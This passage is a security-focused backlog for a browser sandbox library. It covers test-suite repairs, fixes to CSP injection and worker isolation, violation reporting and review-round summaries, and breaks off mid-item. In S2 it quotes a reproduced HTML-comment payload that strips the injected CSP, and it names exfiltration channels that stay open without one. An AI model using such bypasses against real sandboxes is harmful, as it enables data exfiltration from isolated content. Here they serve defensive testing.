# Backlog

The open work on `web-sandbox`, in one place: broken foundations first, then security,
capabilities, parity with existing solutions, and repo hygiene.

Every "current state" line below was verified against the code on 2026-08-29 — commands run,
line numbers checked. Where a document or a README claims something the code does not do, the
gap is filed as an item rather than quietly edited away.

Whether this project should continue at all — rather than adopting an existing solution — is
answered separately in [ADR-001](ADR-001-continue-or-adopt.md). This backlog assumes its
conditional "continue".

**Priority**: P0 blocks everything else · P1 next · P2 planned · P3 opportunistic.
**Effort**: S ≈ hours · M ≈ days · L ≈ week+.

---

## Snapshot

| Area | State |
| :--- | :--- |
| Core isolation (`srcdoc` + opaque origin + immutable CSP) | ✅ implemented, `src/host.ts` |
| CSP generation from typed config | ✅ one fixed template per mode, every directive explicit (`'none'` when empty), filled with the exact origins of `origins` per kind of load, parsed once by the one origin parser shared with `fetchBridge.allow`; no value can add a directive or a source expression (S47, [ADR-007](ADR-007-typed-origins.md)) |
| Private `MessageChannel` transport | ✅ implemented, iframe + worker; taken only from the host's INIT_PORT, never reachable by guest code, only the current environment's port heard (S21) |
| Promise-based RPC, both directions | ✅ `src/lib/rpc.ts`, allowlist-only, iframe + worker (B1); every refusal carries a code the other side cannot forge (B7); at most 256 inbound calls in flight per environment, then `BUSY` (S22) |
| Host-mediated network | ✅ opt-in `fetchBridge`: `sandboxFetch()` under the bridge discipline, every request logged as a `fetch` event, refusals coded (B5, [ADR-006](ADR-006-fetch-bridge.md)) |
| Modes | ✅ `'strict'` (the default), `'cooperative'` (cooperative content; its limits a frozen list, S44) and `'worker'` (frozen; to be folded into strict mode, S49); `'iframe'` was renamed `'cooperative'` and fails closed with a reason that says so (S48, [ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-15-strict-is-the-default-cooperative-modes-limits-are-frozen)) |
| Limits | **Strict mode, every default user**: host-page availability wherever the view shares the host's thread (S42, S52), CSS within the policy, worker violation reports per engine and guest-influenced, a worker that closes itself, memory, same-site cookies on requests to allowed origins (every mode). **Cooperative mode only**, a frozen list (no new guest-realm patches; new findings are documented here): S6 same-thread execution, S8, S13, S15, S17, S18, S35's and S36's residuals, forgeable violation reports, CB3-class guest-only stalls (S44) |
| Worker-mode isolation | ✅ worker spawned inside the sandbox frame (S1); it keeps only allowlisted globals, so every request it can make goes through `fetch`, `XMLHttpRequest`, `WebSocket` or `importScripts`, each governed by the policy on every engine (S43) |
| Lifecycle & events | ✅ `state`, `terminate()`, `reset()`, teardown on removal (B2); `sandbox-log` dispatched on the element and bubbling (B3), normalised, labelled `guest`/`host` and rate-limited (S22); `violation` for refused loads, capped per environment (S5; per directive for the strict view, S24); a listener's `reset()`/`terminate()` is never undone, through one helper (S22); every build failure, and every config that cannot be used, is a termination with a reason, and the config is a copy (S26); `workerExecutionTimeout` requires a free event loop at each `execute()` deadline, else terminates (B8, S30); `ready` is the guest's check-in, never its subresources, with its calls and `execute()` held in the guest until its document is parsed (S46) |
| Auto-sizing | ✅ opt-in `autoResize` (strict and cooperative mode): height validated, clamped, at most one write per frame and 30 per second (B6) |
| Execution budget | ✅ strict mode, the default, bounds guest logic on every engine: it runs only in a worker the watchdog stops (S6, [ADR-005](ADR-005-strict-mode.md)); worker mode too; cooperative mode: opt-in watchdog, bounded in out-of-process frames, not where the frame shares the host's thread (a cooperative-mode limit, S44) |
| Strict mode | ✅ the default (S48): guest code only in a worker, a view running only the hash-admitted library bootstrap, rendered markup cleaned (no nested frames, scripts, `meta`, `base`, SVG animation) and moved, links inert (one constant href), one render in flight, delegated events, view liveness check, the worker's source URL revoked once it ran (S6, S13, S17, S18, S24; [ADR-005](ADR-005-strict-mode.md)) |
| Unit tests | ✅ `src/**` and `test/unit` run and pass (T2) |
| E2E tests | ✅ e2e + research specs run on a shared harness (T1); files covered on all three engines by `files.spec.ts` (section C); the specs run the playground's presets, and a security preset without a spec fails the unit suite (T4) |
| `bun run test` / `bun run build` | ✅ both work from a clean checkout (T3) |
| Type check | ✅ `bun run typecheck` is clean and gates CI (H3) |
| CI | ✅ type check, unit tests, both builds, package smoke test; e2e on Chromium, Firefox, WebKit (D2), and the strict-mode design probes (research 15) on all three (S45) |
| CSP delivery | 🟡 `<meta>` only, now always first in `<head>` (S2 fixed); 3 directives discarded (S7); pre-policy egress window over guest markup (S8, cooperative mode) |
| Default policy | ✅ the template: `base-uri`, `form-action`, `frame-src`, `object-src`, `manifest-src` always `'none'` (S9), every fetch directive `'none'` unless `origins` lists an origin (S16); no `'self'`, `data:`, wildcard or scheme can be configured (S14, S47); `blob:` only with registered files, only for their types' kinds ([ADR-004](ADR-004-files-as-blob-urls.md)) |
| Files | ✅ guest-realm `blob:` URLs through `sandboxFiles` (`list`/`url`/`read`/`text`), both modes, typed by extension, capped at 8 MiB / 1000 files (C1–C3, S3, [ADR-004](ADR-004-files-as-blob-urls.md)); guest markup names files by path (`<script src>`, `<link href>`, media `src`, `srcset`), each only for a load its type is for (S27); modules import each other by relative path through one import map (es-module-lexer, bundled); stylesheets and inline styles by `url()` and `@import` (host-side CSS tokenizer, dependency-ordered slots, cycles fail closed); guest writes opt-in (`guestWrites`): checked by the store's own rules into a per-environment overlay, never given a URL in the guest (the strict view shows the raster images among them from URLs it mints, S54), kept only by an explicit `commitGuestWrites(paths)`, code only with `{ code: true }` (C5) |
| Host page URL | ✅ in strict mode, the default: guest code sees only its worker's `blob:` URL and no request carries a `Referer`. Cooperative mode (limits, S44): hidden from the guest's document (base URL `about:blank`, no-referrer frames, S15), but the host origin stays visible where engines expose it (`ancestorOrigins`, image `Referer`); in WebKit a frame the guest creates reads the host URL as its referrer (S17) and a guest asking for `unsafe-url` sends it to same-site origins (S18) |
| API reference | ✅ [`API.md`](API.md): the whole public surface, checked against the code by a unit test (D3); framework adapters out of scope |
| Installable package | 🟡 typed ESM build in `dist/`, packed and smoke-tested in CI; `private: true` until H5's licence is chosen (D1) |
| Adversarial review 2026-10 | ✅ 21 candidates: 19 fixed (S19–S24), 1 held and is now asserted (A8, S20), 1 documented by design (S25), none of them left as a residual (the default-mode residuals stated elsewhere remain: S44); the follow-up by-construction audit moved C1, C4 and C5 to done (S24), found two gaps (S26) and hardened A3, A6, A7, B5, B6; [report](security/ADVERSARIAL-REVIEW-2026-10.md) |
| Broad review 2026-10-14 | ✅ reviewers A, B, D (S32–S37): the guest announces its port (CB1, PD8), bounded loading (CB3), no `data:` workers (PD1), guest-realm hardening for keepalive, history, `window.name`, DNS prefetch (PD2–PD4, PD6) with residuals stated (S35, S36); reviewer C's strict-mode findings (ST1–ST4) are reported separately; [report](security/BROAD-REVIEW-2026-10-14.md) |
| Independent verification 2026-10-14 | ✅ five verifiers (63 of 66 mutations caught): a Firefox worker's `EventSource` and `FontFace` passed the policy, closed by an allowlist of worker globals (S43); a strict entry's synchronous console lines arrive (S45); the cooperative-mode limits in one list, user actions and history added (S44); 9 test gaps closed and the design probes in CI (S45); decision 1, `ready` on the guest's check-in (S46); decision 2, strict mode the default (S48); [report](security/VERIFICATION-2026-10-14.md) |
| Focused review 2026-10-14 | ✅ 11 findings and one hardening, all closed (S27–S31): a reference names a file only for the kind of load its type is for (W1), rates hold in any one-second window (W2), the strict renderer removes SVG animation (F1), `workerExecutionTimeout` is a free event loop at the deadline (F2), no error text in reasons (F3), no assigned config keys (F4), one eval writer (F5), refused configs never stored (F6); [report](security/FOCUSED-REVIEW-2026-10-14.md) |
| Review round 1 2026-10-15 | 🟡 not clean (the stopping rule's count stays 0): 8 medium and 22 low or info findings from four reviewers (R5 did not complete), all fixed or documented (S50–S53): the host page's policy (S50), one console relay with byte budgets (S51), the strict view's character and rate budget and a linear renderer (S52), the low findings and the cooperative modifier-click residual (S53); the owner's three decisions done (S54); [report](security/REVIEW-ROUND-1-2026-10-15.md) |
| Review round 2 2026-10-15 | 🟡 not clean (the count stays 0): 2 high and 8 medium findings in our code from three defensive reviews (lifecycle model, change audit, documented limits measured), all fixed (S55): intrinsics captured before guest code (C-1), the byte measure on a cloned snapshot with an allow-list (C-3), worker mode `ready` only with a running worker, the host page's Trusted Types reason, a DOM-free import with a build-time view hash, one build predicate, long timers; every documented limit held at its edge on all three engines; round 3 held by the owner (S56); [report](security/REVIEW-ROUND-2-2026-10-15.md) |
| Review round 3 2026-10-18 | 🟡 not clean (the count stays 0): 2 high and 6 medium findings in our code from the same three reviews, all fixed (S57): whole RPC frames and a guest call budget (`callLimits`), the view's time budget charges only measured rendering, `allowAnimations` (default `true`; `false` removes animations and transitions from the view) and `allowAutoplay` (default `false`); where the view runs per engine measured ([research 16](research/16_view_isolation/README.md)); round 4 held by the owner (S58); [report](security/REVIEW-ROUND-3-2026-10-18.md) |
| Review round 4 2026-10-18 | 🟡 not clean (the count stays 0): no high finding for the first time, 5 medium in our code, all fixed (S62): the worker's own `postMessage` removed, values read once, the still-style rewrite bounded, build completion after a frame's load, the view's URL policy and budget (`VIEW_MAX_URLS`, `VIEW_URLS_PER_SECOND`); the default call rate 1000 per second; round 5 next (S63); [report](security/REVIEW-ROUND-4-2026-10-18.md) |
| Review round 5 2026-10-18 | 🟡 not clean (the count stays 0): 1 high and 6 medium in our code, all in code earlier per-instance fixes added; [research 18](research/18_finding_classes/README.md) found the recurring classes; fixes as class slices (S64, done), then a lifecycle reducer (S65), a relay-worker probe (S66, done: build it, S69), one config schema (S67) and the view's cost bound (S68); [report](security/REVIEW-ROUND-5-2026-10-19.md) |

*Updated after the fixes for [issue #6](https://github.com/MentalGear/web-sandbox/issues/6): milestone
M1 plus S1, S2, S9 and the new S10–S12 are done; S14 was added and done on 2026-10-13. On 2026-10-13
the virtual-files Service Worker was replaced by guest-realm blob URLs ([ADR-004](ADR-004-files-as-blob-urls.md)):
S3, C2 and C3 done, C1 partly, C4 rejected, C5 added; C1's markup references, module graph and CSS references followed the same day, completing C1.
S15 and S16 were done on 2026-10-13, and S17 added. Strict mode landed on 2026-10-13 ([ADR-005](ADR-005-strict-mode.md), measured first in
[research 15](research/15_strict_mode/README.md)): S6 done, S13 and S17 done in strict mode with their default-mode residuals stated, S18 added.
The adversarial review of 2026-10-14 ([report](security/ADVERSARIAL-REVIEW-2026-10.md)) added S19–S25: S19–S23 done, S24 open (residuals), S25 documented.
Its follow-up audit the same day made C1 and C4 (S24) hold by construction, added and closed S26, and closed B8; S24's C5 was closed
by option B (inert link hrefs), approved by the owner.
D3 was done on 2026-10-14 as an API reference only; its framework adapters moved to Rejected. C5 (guest writes) was done the same day
as a reserved broker method, `sandbox:write` ([ADR-004 amendment](ADR-004-files-as-blob-urls.md#amendment-guest-writes-2026-10-14)).
Two focused review rounds the same day ([report](security/FOCUSED-REVIEW-2026-10-14.md)) added and closed S27–S31.
The broad review the same day ([report](security/BROAD-REVIEW-2026-10-14.md)) added S32–S37: S32–S35 and S37 done, S35's and S36's residuals stated.
Its strict-mode reviewer added S38–S42 (S42 open). The independent verification the same day ([report](security/VERIFICATION-2026-10-14.md))
added S43–S45: S43 and S45 done, S44 the one list of default-mode residuals. Its decision 1 added and closed S46.
S47 replaced the raw-CSP `connectionsAllowed` with typed `origins` and one policy template per mode the same day
([ADR-007](ADR-007-typed-origins.md)): the policy guard rails of S7, S14, S16, S19, S20 (A3, A5) and S34 became
unrepresentable states.
On 2026-10-15 strict mode became the default and `'iframe'` was renamed `'cooperative'` (S48): cooperative mode's
limits are a frozen list (S44: no new guest-realm patches), S42 was accepted and documented, and S49 records folding
worker mode into strict mode. Review round 1 the same day ([report](security/REVIEW-ROUND-1-2026-10-15.md)) added and
closed S50–S53 (R2-2 a cooperative-mode limit); the owner's three decisions on it were done the same day (S54).
Review round 2 the same day, under the owner's adjusted rule ([report](security/REVIEW-ROUND-2-2026-10-15.md)), added and
closed S55. Round 3 (S56, [report](security/REVIEW-ROUND-3-2026-10-18.md)) ran 2026-10-15 to 2026-10-18 and added and closed
S57; round 4 is held by the owner (S58), the Lean evaluation (S59) found no case for Lean and planned cheaper tests for
later (S61), and the clean-up with independent reviews follows when the rounds end (S60). Review round 4
(S58, [report](security/REVIEW-ROUND-4-2026-10-18.md)) added and closed S62; round 5 is next (S63).
Round 5 (S63) found the recurring classes behind the findings ([research 18](research/18_finding_classes/README.md));
its fixes are made as slices of those classes (S64), followed by S65–S68. S65's model-based suite found LM-1, fixed by construction (S71).
The owner's decision on the 2 s operation limit, the repeated-overrun rule, is S72. S73 closes the M-3 burst behind a slow server that PR #47's CI found.
Rows re-checked against the items below on 2026-10-10. Items marked ✅ below keep their original text as a record of what was wrong.*

---

## T · Broken Foundations

### T1 · The entire e2e suite is dark — ✅ **done**

**Done**: every spec now drives `test/e2e/harness.html` through the `SandboxDriver` fixture in
`test/e2e/fixture.ts`. The playground can move without touching the suite.

Every security claim in `docs/research/` is backed by a spec in `test/e2e/`. None of them runs.

**Verified**: all 15 specs fail. Two mechanical causes, both from the playground move:

1. Specs navigate to `http://localhost:4444/` (e.g. `test/e2e/basic.spec.ts:4`), but Vite's root
   has no `index.html` — the playground is at `/playground/index.html`. Every `page.goto` returns
   `ERR_HTTP_RESPONSE_CODE_FAILURE`.
2. Specs call `setConfig({ scriptUnsafe: true })` without `capabilities`. The default is
   `capabilities: []` (`src/host.ts:38`), so the iframe gets `sandbox=""` — no `allow-scripts`,
   no execution, and every `waitForEvent('console')` times out at 30s.

**Proof the fix is mechanical**: with the URL corrected and `capabilities: ['allow-scripts']`
added, `basic.spec.ts` passes in 2.3s.

**Work**: introduce a shared fixture that owns the page URL and a baseline config, and rewrite
the specs against it, so the next playground move breaks one file instead of fifteen.

**Acceptance**: `bun run test:e2e` runs green; deliberately reverting a mitigation turns the
matching `reproduce.spec.ts` red.

### T2 · `test/unit` never runs, and is red when it does — ✅ **done**

**Done**: vitest includes `test/unit`; the test imports `ALLOWED_CAPABILITIES` from
`@src/csp-directives`, its real home, so no new public export was added to `host.ts`.

**Verified**: `test:unit` is `bun vitest --dir src`, so `test/unit/host.test.ts` is silently
excluded. Run it directly and both cases fail: it imports `ALLOWED_CAPABILITIES` from `@src/host`,
but `host.ts` only *imports* that symbol from `./csp-directives` (`src/host.ts:2`) and never
re-exports it, so the value is `undefined`.

This is the deny-list test that guards findings 01, 02 and 05 — the ones that all root-cause to
`allow-same-origin`. It has been asserting nothing.

**Work**: widen the vitest scope to include `test/unit`, and either re-export the constant from
`host.ts` or import it from `@src/csp-directives`. Decide deliberately, since it is public API.

**Acceptance**: `bun run test:unit` collects both directories and is green; deleting the filter
in `setConfig()` (`src/host.ts:70`) turns it red.

### T3 · `bun test` and `bun run build` fail on stale paths — ✅ **done**

**Done**: `bun run test` runs unit then e2e (`bun test` without `run` is Bun's own runner, so the
README now says `bun run test`); Playwright starts Vite itself; `vite build` targets the playground;
`build.ts` no longer copies the removed demo page.

**Verified**, four dead paths:

| Path | Referenced from | Reality |
| :--- | :--- | :--- |
| `research/playwright.config.ts` | `package.json` `test:e2e` | no `research/` dir; config is at repo root |
| `bun vendor/web-sandbox/index.ts` | `playwright.config.ts:30` `webServer.command` | no `vendor/` dir |
| `http://localhost:4444` | `playwright.config.ts:31` `webServer.url` | 404s; the served page is `/playground/index.html` |
| `playground/virtual-files-demo.html` | `build.ts:38` | replaced by `playground/index.html` |

**Work**: point `test:e2e` at the root config, set `webServer.command` to `bun run dev` and
`webServer.url` to the playground, and fix `build.ts`. Note `playwright.config.ts` uses
`testDir: "test"`, which also sweeps up the vitest file from T2 — scope it to `test/e2e`.

**Acceptance**: `bun test` runs unit **and** e2e from a clean checkout; `bun run build` completes.

### T4 · Presets are not wired into the tests — ✅ **done**

**Guarantee**: an attack is written down once, in `src/lib/presets.ts`, and the playground and the
regression specs run that same definition; a security preset without a spec, or a research reproduction
without a preset, fails the unit suite.

**Done**: a preset now carries a `category` (`security` or `demo`), how its code runs (`run`: `script`
through `execute()`, or `markup` through `load()`), the research folder it reproduces (`research`), the URL
that stands for the attacker (`target`) and further payloads for the same attack (`variants`). Specs reach
presets only through `fromPreset('<id>')` (`test/e2e/presets.ts`): the preset's rules as a fresh copy, its
payloads, and `aimedAt(listener)`, which replaces the target and throws when the payload does not contain
it, so an edited preset cannot leave a spec aiming at the placeholder instead of the listener (T5). The
coverage test, `test/unit/presets.test.ts`, scans every spec file for `fromPreset()` literals and fails
when a security preset has no spec, a `docs/research/*/reproduce.spec.ts` runs no preset, a preset's
`research` folder does not run it, a spec reads `PRESETS` directly, or a target is missing from a payload
(both failure directions checked by mutation). Changes: all fourteen reproductions source payload and rules
from a preset; four presets added for the findings that had none (`csp-swallow` 11, `form-action-exfil`
12, `popup-exfiltration` 13, `self-navigation` 14, with variants for 11.3 and 14.1); `security.spec.ts`
runs the `outer-frame-tampering`, `sw-tamper`, `storage-sharing` and `allow-same-origin` payloads it used
to duplicate, `worker-timeout.spec.ts` the `worker-timeout` preset; the four capability-filter presets
(`alert-test`, `allow-same-origin`, `allow-top-nav`, `allow-popups-escape`), which no spec ran, have one
now (`test/e2e/capability-presets.spec.ts`, each with a positive control where one exists). Two presets
were wrong and are fixed: `alert-test` logged `PWN_SUCCESS` whenever `alert()` returned, which a blocked
dialog does at once (now the host watches for a dialog); `storage-sharing` wrote before it read, so it
could only ever read its own write (now it reads first). T5's evidence rules are unchanged: every egress
assertion keeps its listener and positive control.

The README's stated USP is *"Use the same Preset definitions for both manual testing (Playground)
and automated regression testing"*.

**Verified**: `src/lib/presets.ts` defines 18 presets covering findings 01–10 — and
`playground/playground.ts` is the only file that imports it. No test references presets; the
specs hard-code their payloads. The unification is documented but not built.

**Work**: drive the e2e regression specs from `PRESETS`, so a new attack vector is added once.

**Acceptance**: each `reproduce.spec.ts` sources its payload and rules from a preset id; adding a
preset without a spec fails a coverage assertion.

### T5 · Egress specs rely on request routing that can miss guest requests — ✅ **done**

**Guarantee**: every "nothing left the sandbox" assertion rests on evidence that cannot silently
miss a request.

**Done**: no egress spec rests on route or request silence any more. Playwright routing is gone from
every egress assertion; its place is taken by `test/e2e/recorder.ts`, two HTTPS listeners on loopback
outside the browser (ALLOWED, which positive controls put in the policy, and BLOCKED, which every attempt
targets) that also answer WebSocket handshakes. Each attempt is asserted by the guest's own outcome
and, where the engine raises one, the violation reported on the host (S5); the listener must stay silent.
Every file has a positive control per channel: the same loads to ALLOWED succeed, reach the listener and
raise no violation, or, where no configuration can permit the load, the same load from a frame on the host
page reaches BLOCKED. Specs changed:
- `test/e2e/security.spec.ts` (nested frame), `hard-security.spec.ts` (CSS, image, beacon, ping, popup),
  `worker-security.spec.ts` (fetch, `importScripts`), `empty-directive.spec.ts`;
- `test/e2e/blob-delivery.spec.ts` sections 5 and 5a (blob: script, module, stylesheet and worker
  attempts, now with fetch, import, image, WebSocket and per-engine violations, plus a positive control in
  both modes); the blob: stylesheet test asserted route silence alone before;
- `test/e2e/files.spec.ts` sections 4 and 9 (listener instead of route, and a positive control); section
  8 drops its request recording, which had no positive control;
- research 01 (the nested frame relays its own violation; preset updated), 04 (WebSocket listener), 05
  and 06 (assert the refusal, not the absence of success), 08, 09, 10 (base-uri violation), 12.2, 13, 14.1.

**Not strengthened further**, and why:
- 14.1 self-navigation: the refusal is reported to the wrapper, which runs no script, so there is no
  violation and no outcome event to await. The evidence is the listener after a fixed 2 s wait and the
  page's frame URLs; each vector's positive control (the same markup in a sandboxed frame without the
  wrapper) reaches the listener well within that wait.
- 12.2 form-action in Chromium: the guest document is replaced by the refused submission's error page
  before a report is forwarded (measured), so the listener after a 2 s wait is the evidence there.
  Firefox and WebKit report `form-action`. A permitted form cannot be a control (the wrapper refuses
  every navigation), so the control submits the same form from a host-page frame.
- worker mode: WebKit raises no violations in workers and Firefox none for `importScripts` (S5); there the
  load outcome and the listener are the evidence.
- link ping in Firefox: pings are off by default, so there is nothing to refuse; the control shows that
  Firefox sends none to an allowed origin either.
- a frame the guest creates reports violations to itself (research 01 relays them from the payload).
- research 07 (top navigation to `data:`) is asserted by the host page's URL, a browser fact, not a request.
- S8's pre-policy window is not covered by any of these: it is an accepted risk of `<meta>` delivery.

**Verified** (2026-10-13, during the [blob delivery probe](research/blob-delivery-probe.md)): in
Chromium, Playwright's `context.route` saw the guest frame's subresource requests only
intermittently (1 run in 4, unless the host page made a request first). A spec whose only evidence is
"the route recorded no request" can therefore pass while a request went out.

**Work**: audit the egress specs (`security`, `hard-security`, `worker-security`, the research
specs) and back every route-only check with evidence that cannot be missed: a CSP violation event
from inside the guest, the guest's own load/error outcome, and where it matters a listener outside
the browser (as the probe's raw TCP listener did). Keep routing as secondary evidence.

**Acceptance**: no egress spec passes on route silence alone; a deliberately permitted request is
observed by every evidence channel the spec uses (a positive control), in all three engines.

New egress specs follow this already: section 4 of `test/e2e/files.spec.ts` requires, for every
attempt, both a refused load outcome and the matching CSP violation, with a permitted load as the
outcome channel's positive control and routing only as secondary evidence. Its section 8 does the
same for markup references that must not resolve: no violation is possible there (the URL never
resolves), so a refused absolute URL in the same document is the violation channel's positive
control, and a matched reference the outcome channel's.

---

## S · Security & Correctness

### S1 · Worker mode escapes the sandbox CSP — ✅ **done**

**Done**: worker mode now creates the sandbox frame too, and a bootstrap inside it spawns the worker
(`src/lib/worker-bootstrap.ts`), so the worker inherits the opaque origin and the sandbox CSP. A
timeout recreates the frame, which terminates the worker. `test/e2e/worker-security.spec.ts`.

**Verified**: `spawnWorker()` builds a `blob:` URL and calls `new Worker()` on the *host* document
(`src/host.ts:206–210`), so the worker inherits the host origin and host CSP — not the sandbox
policy. `initialize()` skips iframe creation entirely in worker mode (`src/host.ts:195`). The code
says so at `src/host.ts:196`:

> `// TODO: this is wrong! we need to place the worker inside the iframe, oterwise the worker has full network access (has host CSP policy)`

`COMPETITOR_ANALYSIS_2.md` lists headless mode as a differentiator, and
`test/e2e/worker-security.spec.ts` claims to assert it — but per T1 that spec has never run.

**Work**: always create the iframe; spawn the worker from inside it so it inherits the opaque
origin and injected CSP; route the `MessagePort` handshake through the frame.

**Acceptance**: worker-mode `fetch` to a domain absent from `connectionsAllowed` is blocked, and
`importScripts` of an external URL fails — asserted in a *running* spec.

### S2 · User markup can delete the injected CSP — ✅ **done**

**Done**: the security block is prepended before any user content instead of spliced into it
(`buildGuestDocument()` in `src/lib/frame-documents.ts`). The parser ignores the user's later
doctype and `<head>` and merges `<html>`, so the CSP meta is always the first parsed `<head>` child.
Asserted against a hostile corpus in `frame-documents.test.ts` and in-browser by research 11.3.

*Raised from P1 after [Research 11.3](research/11_meta_csp_delivery/README.md) reproduced it.*

**Verified**: `createIframe()` inserts the `<meta>` CSP by string-replacing `<head>` or the
`<html…>` tag (`src/host.ts:267–271`), guarded only by `unsafeContent.toLowerCase().includes('<html')`.
Two of the repo's own TODOs sit on those lines (`src/host.ts:261`, `:265`):

> `// TODO: is this secure enough for user provided content? Could user-content contain some trick to avoid having this inserted?`

**Reproduced**: `String.replace` with a non-global regex replaces the *first* textual match
anywhere in the string, with no notion of document structure. The payload
`<html><body><!-- <head> -->…` captures the injection inside an HTML comment, and the sandbox
reports `document.querySelector('meta[http-equiv="Content-Security-Policy"]') === null` — the
document runs with **no CSP at all**. The security block, `<base>` tag and comms script all
vanish with it.

Isolation held in that test, but via the opaque origin (the fetch failed on CORS, not CSP). With
the policy gone, `connect-src` allowlisting is gone: `no-cors` beacons, `sendBeacon`, form posts
and `<a ping>` remain reachable, and the request URL is the exfiltration channel.

Related: a policy that lands outside the *parsed* `<head>` is dropped entirely, not partially
(Research 11.2) — so being textually first is not sufficient.

**Work**: replace regex splicing with a parse-then-serialize step, or prepend the security block
before any user content and assert the parsed result. Fuzz it against hostile inputs.

**Acceptance**: `docs/research/11_meta_csp_delivery/reproduce.spec.ts` §11.3 passes (it is written
to fail against today's code), and the meta is asserted to be the first *parsed* head child across
a corpus of malformed and hostile documents.

### S3 · The session id is readable by sandboxed code — ✅ **done**

**Done** ([ADR-004](ADR-004-files-as-blob-urls.md)): there is no session id any more. Files reach the
guest as `blob:` URLs minted in its own realm, which neither another sandbox nor the host page can
load, and the guest document carries no host identifier and no `<base>`. Tests: section 3 of
`test/e2e/files.spec.ts` (a second sandbox handed the first one's URL gets a network error and
`NOT_FOUND` by name; the host page cannot load it either; each lists only its own files) and
`test/unit/files.test.ts`.

**Verified**: with virtual files enabled, the session UUID is embedded in the `<base href>`
(`src/host.ts:228`, `:257`). `sw.ts` treats that id as a capability token — *"possession of the
URL implies access rights"* (`src/virtual-files/sw.ts:44-46`) — but the sandbox can read its own
`<base>` and exfiltrate it wherever CSP permits. The TODO at `src/host.ts:227` asks the same
question.

**Work**: either stop treating the id as a secret and add an origin/mode check in the SW fetch
handler, or rotate per load and keep the mapping host-side. Document which model is in force.

**Acceptance**: a spec showing another sandbox instance cannot read the first instance's files
even when handed its session id.
If the Service Worker is replaced by blob-URL files, this guarantee moves to C1's containment
acceptance rather than disappearing with it.

### S4 · `scriptUnsafe` has no guard rail — ✅ **done**

**Guarantee**: an instance that enables `scriptUnsafe` says so on the console exactly once, naming the
risk: guest code can run strings as code.

**Done**: `setConfig()` warns once per instance when `scriptUnsafe` is on (`_warnAboutScriptUnsafe` in
`src/host.ts`), however often `reset()`, `load()` or `setConfig()` rebuild the environment; only a
literal `true` enables it, since the value is also interpolated into the guest bootstrap. The README
states that it exists for testing. Tests:
- unit: `test/unit/host.test.ts` (one warning across `setConfig()`, `reset()`, `load()`, a mode switch
  and an off/on toggle; one more for a second instance; none, and no `'unsafe-eval'`, for any value
  other than `true`);
- e2e: section S4 of `test/e2e/guard-rails.spec.ts` (one warning across reset and setConfig in both
  modes, the guest's `eval` runs with it on and is refused with an `EvalError` without it).

**Verified**: `scriptUnsafe: true` appends `'unsafe-eval'` to `script-src` (`src/host.ts:246`)
with no warning at any level; the TODO at `src/host.ts:9` asks for one. It is enabled in most
presets and in every e2e spec, so it is the path of least resistance for a copy-paste consumer.

**Work**: a one-time console warning when enabled, and a prominent README note that it exists for
testing. **Acceptance**: enabling it emits exactly one warning per instance.

### S5 · No CSP violation reporting — ✅ **done**

**Guarantee**: every CSP violation the engine raises in the guest's own document (iframe mode) or worker
(worker mode) is offered to the host as a `violation` event on the element, by a listener installed
before any guest code runs. A report is evidence that the guest attempted a refused load; it is never a
host fact, and its absence proves nothing.

**Done**: the guest bootstrap (`src/lib/in-sandbox-script.ts`) registers a capture listener for
`securitypolicyviolation` on the global object as its first act, so it is the first listener on every
violation's path, and forwards trusted events as a first-class `VIOLATION` frame on the port (outside the
broker, so no exposed method name can collide); reports raised while the markup is still parsed wait for
the port. The host (`_dispatchViolation`, `src/host.ts`) validates and clamps the frame
(`toViolationDetail`, `src/lib/violation.ts`: a lowercase directive name, strings cut at 2048 characters,
positions only as positive integers, nothing else read) and dispatches `violation`, bubbling like
`sandbox-log`. Both sides cap it at 100 per environment (`VIOLATION_EVENT_LIMIT`); the host's cap is the
bound, with one warning, since guest code can reach the port. Tests:
- unit: `src/lib/violation.test.ts` (validation and clamping), `src/lib/in-sandbox-script.test.ts`
  (registered first, as a capture listener; buffered before the port; synthetic events ignored; guest-side
  cap), `test/unit/host.test.ts` (detail, bubbling, host cap with one warning, reset per environment);
- e2e: `test/e2e/violations.spec.ts` (image and fetch reported with the element as target; a second
  sandbox apart; a violation during markup parsing; guest listeners that stop propagation on window and
  document cannot hide one; synthetic events not forwarded; a frame forged on the port clamped; the flood
  cap; worker mode per engine). `security.spec.ts`, `hard-security.spec.ts` and `worker-security.spec.ts`
  now assert the violation instead of waiting for silence.

**Residuals**, stated in the README:
- guest code can suppress its own reports (it can patch `MessagePort.prototype.postMessage` and so reach
  the port), and can forge reports in their place: the detail is validated, never believed;
- a frame the guest creates raises its violations in its own document, which has no listener of ours;
  a navigation the wrapper's `frame-src 'none'` refuses is reported to the wrapper, which runs no script;
- worker mode, measured 2026-10-13 (Chromium 141, Firefox 146, WebKit 26.0 on Linux): Chromium raises
  violations in workers for `fetch` and `importScripts`, Firefox for `fetch` and `WebSocket` but not
  `importScripts`, WebKit none. There the load outcome is the only evidence;
- the cap bounds dispatch, not receipt: a guest that floods the port still costs host time per message
  (S6's open note).

`test/e2e/security.spec.ts:29` records the gap in a comment: *"web-sandbox doesn't have CSP
violation reporting hooked up to postMessage yet"*. Tests must therefore assert the *absence* of a
success log with a 2s timeout — slow and prone to false green.

**Work**: listen for `securitypolicyviolation` inside the sandbox and forward it over the port as
a first-class event. **Acceptance**: a blocked request produces an observable `violation` event on
the host, and the security specs assert on it directly.

### S6 · No execution budget in iframe mode — ✅ **done** (strict mode, the default; cooperative-mode watchdog, its same-thread case a limit, S44)

**Done (strict mode, 2026-10-13)**, decided in [ADR-005](ADR-005-strict-mode.md): `mode: 'strict'` runs guest
code only in a worker spawned by a view document whose policy admits one script, the library's bootstrap, by
its hash; the worker draws into the view with `sandboxView.render()` over a render port the host is not on.
`watchdogTimeout` and `workerExecutionTimeout` watch the worker, so a guest loop never blocks the host's
timers: the acceptance below holds on Chromium, Firefox and WebKit (`test/e2e/watchdog.spec.ts`: a loop at
the entry's top level and through `execute()`, terminated within 1.25 budgets plus slack, the host answering
meanwhile; `reset()` recovers). Rendering stays host-thread work where the view shares the host's thread
(Firefox, WebKit): one render in flight bounds the stall to one apply — measured for a maximal render
(256 Ki characters) ≤ 10 ms in Chromium, 30–150 ms in Firefox, 0.09–0.47 s in WebKit; pathological markup
(20 000 nested elements) about 0.7 s per apply in Firefox and WebKit — and a worker that renders and then
loops is stopped within the budget plus that stall (`strict-render-flood.spec.ts`, `watchdog.spec.ts`). A
view that stops answering ends the sandbox (`the sandbox view stopped responding`, 5 s, always on).

**Done (default mode)**: an opt-in liveness watchdog, `watchdogTimeout` (ms, off by default). The
host pings the guest over the port and the guest bootstrap answers outside the broker; a guest
silent for the whole budget is terminated (reason `the guest stopped responding (watchdog)`),
